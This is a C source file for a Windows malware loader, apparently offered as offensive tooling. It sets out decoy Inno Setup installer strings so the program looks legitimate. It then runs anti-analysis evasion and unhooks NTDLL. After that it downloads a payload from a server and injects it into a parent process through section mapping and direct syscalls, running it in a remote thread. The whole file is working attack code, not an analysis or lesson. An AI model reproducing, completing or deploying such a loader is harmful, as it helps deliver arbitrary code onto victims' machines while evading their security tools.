#include <stdio.h>
#include <Windows.h>
#include "RemoteMappingInjection-Evasion.h"
#include "Evasion.h"
#include "Unhook.h"
#include "syswhispers.h"

// strings of inno setup installer
const unsigned char a1[] = "Inno Setup version 5.5.1.ee1 (u) Copyright 1997-2012 Jordan Russell";
const unsigned char a2[] = "Portions Copyright 2000-2012 Martjin Laan";
const unsigned char a3[] = "Setup will install %s into the following folder.";
const unsigned char a4[] = "To continue, click Next. If you would like to select a different folder, click Browse.";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "At least %s MB of free disk is required.";
const unsigned char a8[] = "Next";
const unsigned char a9[] = "Please read the following License Agreement. You must accept the terms of this agreement before continuing with the installation.";
const unsigned char a0[] = "I accept the agreement";
const unsigned char a11[] = "I do not accept the agreement";
const unsigned char a12[] = "Setup";
const unsigned char a13[] = "It is recommended that you close all other applications before continuing.";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";
const unsigned char a18[] = "Click Next to continue, or Cancel to exit Setup.";
const unsigned char a19[] = "Select the components you want to install; clear the components you do not want to install. Click Next when you are ready to continue.";
const unsigned char a20[] = "Full installation";
const unsigned char a21[] = "Minimal installation";
const unsigned char a22[] = "Installation succeeded.";

int main()
{

	DWORD				ParentPID = { 0 }; //after evasion, this will be the PID of the parent process
	HANDLE				hProcess = NULL;
	OBJECT_ATTRIBUTES	ObjectAttributes = { 0 };
	CLIENT_ID			cid = { 0 };
	SIZE_T				sPayloadSize = NULL; //later to be set to sizeof(Payload) when downloaded from server
	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pLocalAddress = NULL,
						pRemoteAddress = NULL;
	PBYTE				Payload = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = 0;
	LARGE_INTEGER		MaximumSize = { 0 };
	
	//Phase 1: Evasion measures
	if (InitEvasion() != 0) {
		return 0xDEADBEEF; //evasion failed
	}

	//Phase 2: Unhook NTDLL
	if (!EvasionUnhook()) {
		return -100; //unhook failed
	}

	// Do the snapshot to find the target process AFTER the evasion func
	ParentPID = FindMyProcess(TARGET_PARENT);
	if (!ParentPID) {
		return -101; //could not find parent process
	}

	//Phase 3: Download payload
	if (!DownloadPayload(PAYLOAD, &Payload, &sPayloadSize)) {
		return -102;
	}
	// update maximum size for section based on downloaded payload size
    MaximumSize.HighPart = 0;
    MaximumSize.LowPart = (DWORD)sPayloadSize;
	if (!MaximumSize.LowPart) {
		if (Payload) LocalFree(Payload);
		return -103; //payload size is zero, failed to download or empty
	}

	//Phase 4: Open handle to remote process
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (HANDLE)(ULONG_PTR)ParentPID;
	cid.UniqueThread = NULL;
	//printf("Opening process with PID: %d\n", ParentPID);
	STATUS = Sw3NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &cid);
	if (!NT_SUCCESS(STATUS) || hProcess == NULL) {
		if (Payload) LocalFree(Payload);
		return -104; //could not open process
	}

	//Phase 5: Allocate memory in remote process
	//printf("Create a section of size: %d bytes in remote process...\n", sPayloadSize);
	STATUS = Sw3NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(STATUS) || !hSection) {
		CloseHandle(hProcess);
		if (Payload) LocalFree(Payload);
		return -105; //could not create section
	}

	// Phase 6: Map the section into local process (to copy later)
	STATUS = Sw3NtMapViewOfSection(hSection, NtCurrentProcess(), &pLocalAddress, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		CloseHandle(hSection);
		CloseHandle(hProcess);
		if (Payload) LocalFree(Payload);
		return -106; // could not map view of section
	}

	// Phase 7: Write the payload into the remote process
	memcpy(pLocalAddress, Payload, sPayloadSize); //ezpz

	// Phase 8: Unmap the local view of section
	Sw3NtUnmapViewOfSection(NtCurrentProcess(), pLocalAddress);
	pLocalAddress = NULL; // invalidate pointer

	// Phase 9: Allocate remote map view in remote process
	sViewSize = 0; // reset view size
	STATUS = Sw3NtMapViewOfSection(hSection, hProcess, &pRemoteAddress, 0, 0, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(STATUS)) {
		Sw3NtUnmapViewOfSection(hProcess, pRemoteAddress);
		CloseHandle(hSection);
		CloseHandle(hProcess);
		return -107; // could not map view of section for exec
	}

	// Phase 10: Create a thread in the remote process to execute the payload
	STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(STATUS)) {
		Sw3NtUnmapViewOfSection(hProcess, pRemoteAddress);
		CloseHandle(hSection);
		CloseHandle(hProcess);
		return -108; // could not create thread
	}

	//printf("\n[+] oh dayum!\n");

	// end: close handles and clean up
	Sw3NtClose(hThread);
	Sw3NtClose(hSection);
	Sw3NtClose(hProcess);
	if (Payload) {
		LocalFree(Payload); // free the payload array
	}
	return 0; 
}

